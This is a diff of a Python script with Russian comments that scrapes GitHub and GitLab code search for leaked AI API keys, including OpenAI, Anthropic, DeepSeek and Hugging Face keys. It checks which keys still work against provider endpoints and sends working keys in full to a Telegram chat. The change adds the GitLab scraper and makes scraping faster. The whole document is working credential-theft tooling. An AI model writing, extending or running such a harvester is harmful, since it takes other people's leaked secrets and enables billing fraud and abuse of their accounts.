@@ -1,4 +1,3 @@
-import base64
 import os
 import re
 import sys
@@ -18,12 +17,13 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
+GITLAB_TOKEN = os.getenv("GITLAB_TOKEN", "") # Токен GitLab
 CHAT_ID = os.getenv("CHAT_ID")
 
 TOTAL_RUN_TIME = 3600
 REPORT_INTERVAL = 900
 
-# Паттерны ключей. generic-sk теперь ловит длинные ключи вида sk-api-...
+# Паттерны ключей
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
@@ -33,7 +33,7 @@ KEY_PATTERNS = [
     {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
     {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
     {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
-    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-[A-Za-z0-9_-]{32,}\b")}, # Ловит очень длинные
+    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-[A-Za-z0-9_-]{32,}\b")},
 ]
 
 URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')
@@ -76,7 +76,7 @@ def mark_dead(key):
     conn.commit()
     conn.close()
 
-# ─── ПАРСИНГ ───────────────────────────────────────────────────────────────
+# ─── ПАРСИНГ GITHUB ────────────────────────────────────────────────────────
 repo_url_cache = {}
 
 def get_urls_from_repo_configs(repo):
@@ -85,20 +85,16 @@ def get_urls_from_repo_configs(repo):
         
     found_urls = []
     try:
-        # 1. Получаем дерево файлов репозитория (1 запрос)
         tree_url = f"https://api.github.com/repos/{repo}/git/trees/HEAD?recursive=1"
         resp = requests.get(tree_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"}, timeout=10)
         
         if resp.status_code == 200:
             tree = resp.json().get("tree", [])
-            
-            # 2. Ищем файлы конфигов
             config_files = []
             for item in tree:
                 if item["type"] == "blob" and any(x in item["path"].lower() for x in ['.env', 'config', 'settings']):
                     config_files.append(item["path"])
             
-            # Берем максимум 3 файла, чтобы не спамить API
             for path in config_files[:3]:
                 file_url = f"https://api.github.com/repos/{repo}/contents/{path}"
                 f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
@@ -109,48 +105,35 @@ def get_urls_from_repo_configs(repo):
                         if any(x in u for x in ['github.com', 'telegram', 'w3.org']): continue
                         match = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                         if match: found_urls.append(match.group(1))
-    except Exception as e:
-        logger.error(f"Ошибка при поиске конфигов в {repo}: {e}")
+    except: pass
         
     repo_url_cache[repo] = list(set(found_urls))
     return repo_url_cache[repo]
 
-def fetch_targets():
-    logger.info("🔎 Ищу ключи на GitHub...")
+def fetch_github_targets():
+    logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
     
-    # Ищем конкретные префиксы живых ключей, а не просто "sk-"
     queries = [
-        "sk-proj- language:Python", 
-        "sk-ant-api03- language:Python", 
-        "sk-kimi- language:Python",
-        "sk-cp- language:Python",
-        "sk-sp- language:Python",
-        "hf_ language:Python",
-        "sk- language:JSON", 
-        "sk- language:YAML",
-        "sk- language:JavaScript"
+        "sk-proj- language:Python", "sk-ant-api03- language:Python", 
+        "sk-kimi- language:Python", "sk-cp- language:Python",
+        "sk-sp- language:Python", "hf_ language:Python", 
+        "sk- language:JSON", "sk- language:YAML", "sk- language:JavaScript"
     ]
     query = random.choice(queries)
-    page = random.randint(1, 10) # Расширили страницы
+    page = random.randint(1, 10) 
     
     try:
         resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
-        if resp.status_code == 403:
-            logger.error("❌ 403: Лимит GitHub или неверный токен.")
-            return []
+        if resp.status_code == 403: return []
         resp.raise_for_status()
         
         items = resp.json().get("items", [])
-        logger.info(f"✅ Найдено файлов на странице {page}: {len(items)}")
-        
         targets = []
-        # Обрабатываем до 30 файлов за раз, чтобы быстрее набивать статистику
+        
         for item in items[:30]:
             repo = item["repository"]["full_name"]
             path = item["path"]
-            
-            # Быстрый запрос файла (без лишних пауз)
             file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
             
             if file_resp.status_code == 200:
@@ -161,47 +144,37 @@ def fetch_targets():
                             token = match.group(0)
                             api_urls = []
                             
-                            # 1. URL в строке
                             urls = URL_REGEX.findall(line)
                             for u in urls:
                                 if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                                 match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                                 if match_url: api_urls.append(match_url.group(1))
                             
-                            # 2. Если ключ от известного провайдера, не тратим время на конфиги!
                             if not api_urls and p["provider"] in ["openai", "anthropic", "huggingface"]:
                                 api_urls.append(PROVIDER_ENDPOINTS[p["provider"]])
-                            
-                            # 3. Если ключ generic, ищем в конфигах
+                                
                             if not api_urls:
-                                api_urls.extend(get_urls_from_repo_configs(repo)[:1]) # Берем только 1
+                                api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                             
-                            # 4. Переменная
                             if not api_urls:
                                 var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                                 var_name = var_match.group(1).lower() if var_match else ""
                                 for hint, url in REPO_HINTS.items():
-                                    if hint in var_name:
-                                        api_urls.append(url)
-                                        break
+                                    if hint in var_name: api_urls.append(url); break
                                 if not api_urls:
                                     if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                     elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                             
-                            # 5. Название репо
                             if not api_urls:
                                 combined = (repo + " " + path).lower()
                                 for hint, url in REPO_HINTS.items():
                                     if hint in combined: api_urls.append(url); break
                                     
-                            # 6. Дефолт
                             if not api_urls:
                                 api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
                                 
-                            for url in list(set(api_urls))[:1]: # Берем только 1 лучший URL
+                            for url in list(set(api_urls))[:1]:
                                 targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-            
-            # Убрали time.sleep(1), GitHub API выдержит быстрый парсинг
             time.sleep(0.2) 
             
         unique_targets = []
@@ -213,10 +186,76 @@ def fetch_targets():
                 unique_targets.append(t)
         return unique_targets
     except Exception as e:
-        logger.error(f"❌ Ошибка поиска: {e}")
+        logger.error(f"❌ Ошибка GitHub: {e}")
         return []
 
-# ─── ПРОВЕРКА (ПАРАЛЛЕЛЬНАЯ) ───────────────────────────────────────────────
+# ─── ПАРСИНГ GITLAB ────────────────────────────────────────────────────────
+def fetch_gitlab_targets():
+    logger.info("🦊 Ищу ключи на GitLab...")
+    headers = {"PRIVATE-TOKEN": GITLAB_TOKEN} if GITLAB_TOKEN else {}
+    
+    queries = ["sk-proj-", "sk-ant-", "hf_", "sk-"]
+    query = random.choice(queries)
+    page = random.randint(1, 10)
+    
+    try:
+        url = "https://gitlab.com/api/v4/search"
+        params = {"scope": "blobs", "search": query, "per_page": 30, "page": page}
+        resp = requests.get(url, headers=headers, params=params, timeout=15)
+        
+        if resp.status_code != 200:
+            logger.error(f"❌ GitLab API: {resp.status_code}")
+            return []
+            
+        items = resp.json()
+        targets = []
+        
+        for item in items:
+            snippet = item.get("data", "")
+            if not snippet: continue
+                
+            lines = snippet.split('\n')
+            for line in lines:
+                for p in KEY_PATTERNS:
+                    for match in p["regex"].finditer(line):
+                        token = match.group(0)
+                        api_urls = []
+                        
+                        urls = URL_REGEX.findall(line)
+                        for u in urls:
+                            if any(x in u for x in ['github.com', 'gitlab.com', 'telegram', 'w3.org', '.jpeg']): continue
+                            match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                            if match_url: api_urls.append(match_url.group(1))
+                            
+                        if not api_urls and p["provider"] in ["openai", "anthropic", "huggingface"]:
+                            api_urls.append(PROVIDER_ENDPOINTS[p["provider"]])
+                            
+                        if not api_urls:
+                            combined = item.get("path_with_namespace", "").lower()
+                            for hint, hint_url in REPO_HINTS.items():
+                                if hint in combined: api_urls.append(hint_url); break
+                                
+                        if not api_urls:
+                            api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
+                            
+                        for url in list(set(api_urls))[:1]:
+                            targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+                            
+        unique_targets = []
+        seen = set()
+        for t in targets:
+            sig = f"{t['key']}_{t['endpoint']}"
+            if sig not in seen:
+                seen.add(sig)
+                unique_targets.append(t)
+        
+        logger.info(f"🦊 GitLab: извлечено пар: {len(unique_targets)}")
+        return unique_targets
+    except Exception as e:
+        logger.error(f"❌ Ошибка GitLab: {e}")
+        return []
+
+# ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
     try:
         resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
@@ -267,15 +306,18 @@ async def long_scan_loop():
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        targets = await asyncio.to_thread(fetch_targets)
+        # 50/50: либо GitHub, либо GitLab
+        if random.choice([True, False]):
+            targets = await asyncio.to_thread(fetch_github_targets)
+        else:
+            targets = await asyncio.to_thread(fetch_gitlab_targets)
+            
         total_checked += len(targets)
         
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
             
-            # Проверка базы (навсегда)
-            if is_dead(key):
-                continue
+            if is_dead(key): continue
                 
             logger.info(f"Проверяю {key[:10]}... на {endpoint}")
             chk = await asyncio.to_thread(check_endpoint, key, endpoint)
@@ -286,9 +328,9 @@ async def long_scan_loop():
                 continue
                 
             if chk["status"] == "429":
-                logger.info("   └ ⚠️ Rate Limit (ключ живой, но лимит)")
-                report = f"⚠️ **Ключ с лимитом**\n🌐 {endpoint}\n🗝 {key}\n(Модели не проверены из-за 429)"
-                if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
+                logger.info("   └ ⚠️ Rate Limit (ключ живой)")
+                report = f"⚠️ Ключ с лимитом\n🌐 {endpoint}\n🗝 {key}\n(Модели не проверены из-за 429)"
+                if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
                 total_working += 1
                 cycle_working += 1
                 continue
@@ -300,6 +342,7 @@ async def long_scan_loop():
             if report:
                 total_working += 1
                 cycle_working += 1
+                # Убрали parse_mode="Markdown", чтобы избежать вылетов!
                 if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
                 logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
             else:
@@ -307,7 +350,7 @@ async def long_scan_loop():
                 mark_dead(key)
         
         if time.time() - cycle_start_time >= REPORT_INTERVAL:
-            summary = f"⏳ **Отчет**\nЗа {REPORT_INTERVAL//60} мин:\nПроверено: {total_checked}\nНовых рабочих: {cycle_working}"
+            summary = f"⏳ Отчет\nЗа {REPORT_INTERVAL//60} мин:\nПроверено: {total_checked}\nНовых рабочих: {cycle_working}"
             if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=summary)
             cycle_start_time = time.time()
             cycle_working = 0
